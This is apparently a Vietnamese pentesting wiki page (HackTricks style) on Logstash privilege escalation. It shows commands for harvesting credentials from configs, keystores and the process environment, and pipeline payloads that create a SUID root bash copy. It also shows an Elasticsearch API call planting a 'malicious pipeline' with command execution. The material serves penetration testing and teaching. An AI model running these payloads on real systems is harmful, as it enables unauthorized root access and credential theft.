# Leo thang đặc quyền Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash được dùng để **thu thập, chuyển đổi và phân phối log** thông qua một hệ thống gọi là **pipelines**. Các pipeline này gồm các giai đoạn **input**, **filter** và **output**.<sup>[[4]](#references)</sup> Một khía cạnh đáng chú ý xuất hiện khi Logstash hoạt động trên máy bị xâm nhập.

### Cấu hình Pipeline

Trên các bản cài đặt bằng gói Debian và RPM, pipeline được cấu hình qua **/etc/logstash/pipelines.yml**, tệp này liệt kê các vị trí lưu cấu hình pipeline; các bản phân phối khác đặt `pipelines.yml` trong thư mục `path.settings` của Logstash.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Tệp này cho biết vị trí của các tệp **.conf** chứa cấu hình pipeline. Khi sử dụng **Elasticsearch output**, hãy kiểm tra các cài đặt `user`/`password`, `cloud_auth` hoặc `api_key`; quyền hiệu lực của tài khoản phụ thuộc vào Elasticsearch. Một glob `path.config` sẽ tải mọi tệp khớp với pipeline đó.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Nếu Logstash được khởi chạy với `-f <directory>` thay vì `pipelines.yml`, `-f` được ưu tiên và **mọi tệp trong thư mục đó được nối theo thứ tự từ điển rồi phân tích cú pháp như một cấu hình duy nhất**.<sup>[[6]](#references)[[7]](#references)</sup> Điều này tạo ra 2 hệ quả có thể bị khai thác:

- Một tệp được thả vào như `000-input.conf` hoặc `zzz-output.conf` có thể thay đổi cách pipeline cuối cùng được ghép lại
- Một tệp sai định dạng có thể khiến cấu hình được ghép không vượt qua bước xác thực; khi reload, Logstash giữ lại pipeline trước đó, vì vậy hãy xác thực payload trước khi dựa vào auto-reload.<sup>[[1]](#references)</sup>

### Liệt kê nhanh trên máy chủ bị xâm nhập

Trên máy có cài Logstash, nhanh chóng kiểm tra:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Đồng thời kiểm tra xem API giám sát cục bộ có thể truy cập được không. Theo mặc định, API lắng nghe trên **127.0.0.1:9600**, thường là đủ sau khi có foothold trên host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Các endpoint này hiển thị ID và cài đặt pipeline, chỉ số runtime, cùng bộ đếm thành công/thất bại khi tải lại cấu hình, giúp xác nhận liệu thay đổi có được chấp nhận hay không.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Nếu credential thu hồi được nhắm đến **Elasticsearch**, hãy xem [trang khác này về Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### File input đưa dữ liệu vào dynamic command output

Cấu hình pipeline có thể chỉ đọc đối với người dùng hiện tại, trong khi [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) của nó theo dõi một đường dẫn mà người dùng có thể ghi. Theo dõi pipeline đã tải từ input đó qua mọi [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) đến [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Exec output truyền `command` qua một shell và thay thế các giá trị `%{field}` mà không lọc các ký tự đặc biệt của shell. Đường dẫn input có thể ghi chỉ là dấu hiệu tiềm năng dẫn đến nâng quyền nếu dịch vụ đang chạy dưới một danh tính có đặc quyền cao hơn, file của người dùng thực sự có thể đi vào input đang được theo dõi, các filter và điều kiện output định tuyến nội dung của file vào trường command, và plugin output đó đã được cài đặt, đang hoạt động. Kiểm tra riêng quyền tìm kiếm/ghi thư mục, trạng thái theo dõi của file input và tài khoản dịch vụ thực tế; không ghi test event hoặc gọi output trong quá trình liệt kê thụ động.

### Privilege Escalation via Writable Pipelines

Để thử nâng quyền, trước tiên hãy xác định người dùng thực sự đang chạy dịch vụ Logstash; không mặc định đó là root hoặc người dùng **logstash**. Đảm bảo bạn đáp ứng **một** trong các tiêu chí sau:

- Có **quyền ghi** vào file pipeline **.conf** **hoặc**
- File **/etc/logstash/pipelines.yml** sử dụng wildcard và bạn có thể ghi vào thư mục đích.<sup>[[6]](#references)[[7]](#references)</sup>

Ngoài ra, phải đáp ứng **một** trong các điều kiện sau:

- Có khả năng khởi động lại dịch vụ Logstash **hoặc**
- File **/etc/logstash/logstash.yml** được đặt thành **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Khi cấu hình có wildcard, tạo một file khớp với wildcard này sẽ cho phép thực thi lệnh.<sup>[[7]](#references)[[9]](#references)</sup> Ví dụ:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Ở đây, **interval** xác định tần suất thực thi tính bằng giây. Trong ví dụ đã cho, lệnh **whoami** chạy mỗi 120 giây và chuyển đầu ra vào **/tmp/output.log**.<sup>[[9]](#references)</sup>

Với **config.reload.automatic: true** trong **/etc/logstash/logstash.yml**, Logstash sẽ tự động phát hiện và áp dụng các cấu hình pipeline mới hoặc đã chỉnh sửa mà không cần khởi động lại.<sup>[[1]](#references)[[15]](#references)</sup> Nếu không có wildcard, vẫn có thể chỉnh sửa các cấu hình hiện có, nhưng cần thận trọng để tránh gián đoạn.

### Payload Pipeline đáng tin cậy hơn

Plugin input `exec` vẫn hoạt động trong các bản phát hành hiện tại và cần có `interval` hoặc `schedule`. Plugin thực thi bằng cách **forking** JVM của Logstash, vì vậy nếu thiếu bộ nhớ, payload có thể thất bại với lỗi `ENOMEM` thay vì chạy âm thầm.<sup>[[9]](#references)</sup>

Khi dịch vụ có đủ đặc quyền để tạo tệp SUID do root sở hữu, một payload leo thang đặc quyền thiết thực là payload để lại một artifact tồn tại lâu dài:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Nếu bạn không có quyền khởi động lại nhưng có thể gửi tín hiệu cho tiến trình, Logstash cũng hỗ trợ tải lại được kích hoạt bằng **SIGHUP** trên các hệ thống kiểu Unix:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Lưu ý rằng không phải plugin nào cũng hỗ trợ reload. Ví dụ, input **stdin** ngăn việc reload tự động, vì vậy đừng cho rằng `config.reload.automatic` sẽ luôn áp dụng các thay đổi của bạn.<sup>[[1]](#references)</sup>

### Đánh cắp secrets từ Logstash

Trước khi chỉ tập trung vào code execution, hãy thu thập dữ liệu mà Logstash đã có quyền truy cập:

- Credentials có thể xuất hiện trong các output `elasticsearch {}`, URL/cài đặt của `http_poller`, input JDBC hoặc cài đặt liên quan đến cloud; các plugin này có những trường chứa credential đáng để tìm kiếm.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings có thể nằm trong **`/etc/logstash/logstash.keystore`** hoặc một thư mục `path.settings` khác.<sup>[[5]](#references)[[10]](#references)</sup>
- Mật khẩu keystore có thể được cung cấp qua **`LOGSTASH_KEYSTORE_PASS`**, và các bản cài đặt RPM/DEB lấy biến môi trường của service từ **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Việc mở rộng biến môi trường bằng `${VAR}` được thực hiện khi Logstash khởi động, vì vậy nên kiểm tra môi trường của service.<sup>[[14]](#references)</sup>

Các kiểm tra hữu ích:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Điều này cũng đáng kiểm tra vì **CVE-2023-46672** cho thấy, trong một số trường hợp cụ thể, Logstash ghi thông tin nhạy cảm vào log, bao gồm cả secret được lưu trong keystore và được tham chiếu từ cấu hình; hãy xem lại log Logstash cũ và các mục `journald` nếu những trường hợp đó có thể áp dụng.<sup>[[3]](#references)</sup>

### Lạm dụng quản lý Pipeline tập trung

Trong một số môi trường, host hoàn toàn **không** dựa vào các tệp `.conf` cục bộ. Nếu cấu hình **`xpack.management.enabled: true`**, Logstash có thể lấy các pipeline được quản lý tập trung từ Elasticsearch/Kibana; sau khi bật chế độ này, cấu hình pipeline cục bộ không còn là nguồn thông tin chính thức.<sup>[[2]](#references)</sup>

Điều đó tạo ra một hướng tấn công khác:

1. Khôi phục thông tin đăng nhập Elastic từ cài đặt Logstash cục bộ, keystore hoặc log.<sup>[[3]](#references)[[10]](#references)</sup>
2. Xác minh tài khoản có quyền cluster **`manage_logstash_pipelines`** hay không.<sup>[[16]](#references)</sup>
3. Tạo hoặc thay thế một pipeline được quản lý tập trung để host Logstash thực thi payload của bạn trong lần polling tiếp theo.<sup>[[2]](#references)[[16]](#references)</sup>

API Elasticsearch được dùng cho tính năng này là:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Điều này đặc biệt hữu ích khi các tệp cục bộ chỉ có quyền đọc nhưng Logstash đã được đăng ký để lấy pipeline từ xa.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Tài liệu Elastic: Tải lại tệp cấu hình](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Tài liệu Elastic: Cấu hình quản lý pipeline tập trung](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Bản cập nhật bảo mật Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Tài liệu Elastic: Tạo pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Tài liệu Elastic: Bố cục thư mục Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Tài liệu Elastic: Nhiều pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Tài liệu Elastic: Chạy Logstash từ dòng lệnh](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Tài liệu Elastic: Giám sát Logstash bằng API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Tài liệu Elastic: Plugin input exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Tài liệu Elastic: Keystore secrets cho các cài đặt bảo mật](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Tài liệu Elastic: Plugin output Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Tài liệu Elastic: Plugin input Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Tài liệu Elastic: Plugin input Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Tài liệu Elastic: Sử dụng biến môi trường](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Tài liệu Elastic: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch: Tạo hoặc cập nhật pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash: Lấy cài đặt cho các pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash: Lấy thống kê cho các pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
